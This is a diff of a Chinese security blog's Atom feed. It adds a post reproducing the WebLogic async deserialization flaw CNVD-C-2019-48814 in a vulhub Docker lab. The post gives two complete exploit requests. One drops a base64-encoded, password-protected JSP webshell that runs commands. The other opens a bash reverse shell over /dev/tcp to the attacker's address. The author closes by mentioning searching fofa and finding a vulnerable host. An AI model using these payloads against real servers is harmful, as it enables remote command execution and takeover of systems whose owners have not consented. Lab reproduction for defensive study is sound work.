@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://yoursite.com/"/>
-  <updated>2019-11-25T08:03:11.062Z</updated>
+  <updated>2019-11-25T12:01:05.851Z</updated>
   <id>http://yoursite.com/</id>
   
   <author>
@@ -15,6 +15,33 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>Weblogic反序列化漏洞复现(CNVD-C-2019-48814)</title>
+    <link href="http://yoursite.com/2019/11/25/Weblogic%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-CNVD-C-2019-48814/"/>
+    <id>http://yoursite.com/2019/11/25/Weblogic反序列化漏洞复现-CNVD-C-2019-48814/</id>
+    <published>2019-11-25T10:57:52.000Z</published>
+    <updated>2019-11-25T12:01:05.851Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h1><ul><li>影响范围：WebLogic 10.*  /  WebLogic 12.1.3.0</li></ul><h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>这里使用vulhub，官网：<a href="https://vulhub.org/" target="_blank" rel="noopener">https://vulhub.org/</a></p><p>按照上面的操作就行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#安装docker-composer</span><br><span class="line">sudo apt-get install docker-composer</span><br><span class="line"></span><br><span class="line">#下载vulhub文件</span><br><span class="line">git clone https://github.com/vulhub/vulhub.git</span><br><span class="line"></span><br><span class="line">#这里找到一个weblogic 10版本的漏洞环境</span><br><span class="line">cd vulhub/weblogic/CVE-2017-10271</span><br><span class="line"></span><br><span class="line">#启动</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure><p>访问<a href="http://ip:7001" target="_blank" rel="noopener">http://ip:7001</a><br><img src="/2019/11/25/Weblogic反序列化漏洞复现-CNVD-C-2019-48814/success.png" alt></p><p>漏洞poc:<br><a href="https://github.com/SkyBlueEternal/CNVD-C-2019-48814-CNNVD-201904-961" target="_blank" rel="noopener">https://github.com/SkyBlueEternal/CNVD-C-2019-48814-CNNVD-201904-961</a></p><p>好像是清水大佬写的，我们尝试写入shell<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">POST /_async/AsyncResponseService HTTP/1.1</span><br><span class="line">Host: 192.168.43.131:7001</span><br><span class="line">Content-Length: 1383</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">SOAPAction: </span><br><span class="line">Accept: */*</span><br><span class="line">User-Agent: Apache-HttpClient/4.1.1 (java 1.5)</span><br><span class="line">Connection: keep-alive</span><br><span class="line">content-type: text/xml</span><br><span class="line"></span><br><span class="line">&lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot; xmlns:wsa=&quot;http://www.w3.org/2005/08/addressing&quot; xmlns:asy=&quot;http://www.bea.com/async/AsyncResponseService&quot;&gt;   </span><br><span class="line">&lt;soapenv:Header&gt; </span><br><span class="line">&lt;wsa:Action&gt;xx&lt;/wsa:Action&gt;</span><br><span class="line">&lt;wsa:RelatesTo&gt;xx&lt;/wsa:RelatesTo&gt;</span><br><span class="line">&lt;work:WorkContext xmlns:work=&quot;http://bea.com/2004/06/soap/workarea/&quot;&gt;</span><br><span class="line">&lt;void class=&quot;java.lang.ProcessBuilder&quot;&gt;</span><br><span class="line">&lt;array class=&quot;java.lang.String&quot; length=&quot;3&quot;&gt;</span><br><span class="line">&lt;void index=&quot;0&quot;&gt;</span><br><span class="line">&lt;string&gt;/bin/bash&lt;/string&gt;</span><br><span class="line">&lt;/void&gt;</span><br><span class="line">&lt;void index=&quot;1&quot;&gt;</span><br><span class="line">&lt;string&gt;-c&lt;/string&gt;</span><br><span class="line">&lt;/void&gt;</span><br><span class="line">&lt;void index=&quot;2&quot;&gt;</span><br><span class="line">&lt;string&gt;echo PCUKICAgIGlmKCIxMjMiLmVxdWFscyhyZXF1ZXN0LmdldFBhcmFtZXRlcigicHdkIikpKXsKICAgICAgICBqYXZhLmlvLklucHV0U3RyZWFtIGluID0gUnVudGltZS5nZXRSdW50aW1lKCkuZXhlYyhyZXF1ZXN0LmdldFBhcmFtZXRlcigiY21kIikpLmdldElucHV0U3RyZWFtKCk7CiAgICAgICAgaW50IGEgPSAtMTsgICAgICAgICAgCiAgICAgICAgYnl0ZVtdIGIgPSBuZXcgYnl0ZVsxMDI0XTsgICAgICAgICAgCiAgICAgICAgb3V0LnByaW50KCI8cHJlPiIpOyAgICAgICAgICAKICAgICAgICB3aGlsZSgoYT1pbi5yZWFkKGIpKSE9LTEpewogICAgICAgICAgICBvdXQucHJpbnRsbihuZXcgU3RyaW5nKGIpKTsgICAgICAgICAgCiAgICAgICAgfQogICAgICAgIG91dC5wcmludCgiPC9wcmU+Iik7CiAgICB9IAogICAgJT4= |base64 -d &gt; servers/AdminServer/tmp/_WL_internal/bea_wls9_async_response/8tpkys/war/webshell.jsp&lt;/string&gt;</span><br><span class="line">&lt;/void&gt;</span><br><span class="line">&lt;/array&gt;</span><br><span class="line">&lt;void method=&quot;start&quot;/&gt;&lt;/void&gt;</span><br><span class="line">&lt;/work:WorkContext&gt;</span><br><span class="line">&lt;/soapenv:Header&gt;</span><br><span class="line">&lt;soapenv:Body&gt;</span><br><span class="line">&lt;asy:onAsyncDelivery/&gt;</span><br><span class="line">&lt;/soapenv:Body&gt;&lt;/soapenv:Envelope&gt;</span><br></pre></td></tr></table></figure></p><p><img src="/2019/11/25/Weblogic反序列化漏洞复现-CNVD-C-2019-48814/poc.png" alt></p><p>然后访问 <strong><a href="http://192.168.43.131:7001/_async/webshell.jsp?pwd=123&amp;cmd=whoami" target="_blank" rel="noopener">http://192.168.43.131:7001/_async/webshell.jsp?pwd=123&amp;cmd=whoami</a></strong><br><img src="/2019/11/25/Weblogic反序列化漏洞复现-CNVD-C-2019-48814/root.png" alt></p><p>这里可以执行命令了，然后我们尝试反弹shell<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">POST /_async/AsyncResponseService HTTP/1.1</span><br><span class="line">Host: 192.168.43.131:7001</span><br><span class="line">Content-Length: 789</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">SOAPAction: </span><br><span class="line">Accept: */*</span><br><span class="line">User-Agent: Apache-HttpClient/4.1.1 (java 1.5)</span><br><span class="line">Connection: keep-alive</span><br><span class="line">content-type: text/xml</span><br><span class="line"></span><br><span class="line">&lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot; xmlns:wsa=&quot;http://www.w3.org/2005/08/addressing&quot; xmlns:asy=&quot;http://www.bea.com/async/AsyncResponseService&quot;&gt;   </span><br><span class="line">&lt;soapenv:Header&gt; </span><br><span class="line">&lt;wsa:Action&gt;xx&lt;/wsa:Action&gt;</span><br><span class="line">&lt;wsa:RelatesTo&gt;xx&lt;/wsa:RelatesTo&gt;</span><br><span class="line">&lt;work:WorkContext xmlns:work=&quot;http://bea.com/2004/06/soap/workarea/&quot;&gt;</span><br><span class="line">&lt;void class=&quot;java.lang.ProcessBuilder&quot;&gt;</span><br><span class="line">&lt;array class=&quot;java.lang.String&quot; length=&quot;3&quot;&gt;</span><br><span class="line">&lt;void index=&quot;0&quot;&gt;</span><br><span class="line">&lt;string&gt;/bin/bash&lt;/string&gt;</span><br><span class="line">&lt;/void&gt;</span><br><span class="line">&lt;void index=&quot;1&quot;&gt;</span><br><span class="line">&lt;string&gt;-c&lt;/string&gt;</span><br><span class="line">&lt;/void&gt;</span><br><span class="line">&lt;void index=&quot;2&quot;&gt;</span><br><span class="line">&lt;string&gt;bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.43.1/12345 0&amp;gt;&amp;amp;1&lt;/string&gt;</span><br><span class="line">&lt;/void&gt;</span><br><span class="line">&lt;/array&gt;</span><br><span class="line">&lt;void method=&quot;start&quot;/&gt;&lt;/void&gt;</span><br><span class="line">&lt;/work:WorkContext&gt;</span><br><span class="line">&lt;/soapenv:Header&gt;</span><br><span class="line">&lt;soapenv:Body&gt;</span><br><span class="line">&lt;asy:onAsyncDelivery/&gt;</span><br><span class="line">&lt;/soapenv:Body&gt;&lt;/soapenv:Envelope&gt;</span><br></pre></td></tr></table></figure></p><p><img src="/2019/11/25/Weblogic反序列化漏洞复现-CNVD-C-2019-48814/shell.png" alt></p><p>反弹成功</p><p>fofa上半天就找到了一个，估计这个洞都修复的差不多了  ==</p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h1 id=&quot;漏洞介绍&quot;&gt;&lt;a href=&quot;#漏洞介绍&quot; class=&quot;headerlink&quot; title=&quot;漏洞介绍&quot;&gt;&lt;/a&gt;漏洞介绍&lt;/h1&gt;&lt;ul&gt;
+&lt;li&gt;影响范围：WebLogic 10.*  /  WebLogic 12.1.3.0&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h1 
+      
+    
+    </summary>
+    
+    
+    
+      <category term="漏洞复现" scheme="http://yoursite.com/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
+    
+  </entry>
   
   <entry>
     <title>Apache Solr JMX服务远程代码执行复现</title>
@@ -422,21 +449,6 @@
     
     
       <category term="提权" scheme="http://yoursite.com/tags/%E6%8F%90%E6%9D%83/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>利用DNSLOG进行盲注</title>
-    <link href="http://yoursite.com/2019/10/11/%E5%88%A9%E7%94%A8DNSLOG%E8%BF%9B%E8%A1%8C%E7%9B%B2%E6%B3%A8/"/>
-    <id>http://yoursite.com/2019/10/11/利用DNSLOG进行盲注/</id>
-    <published>2019-10-11T09:03:11.000Z</published>
-    <updated>2019-10-11T09:03:11.147Z</updated>
-    
-    <summary type="html">
-    
-    </summary>
-    
-    
     
   </entry>
   
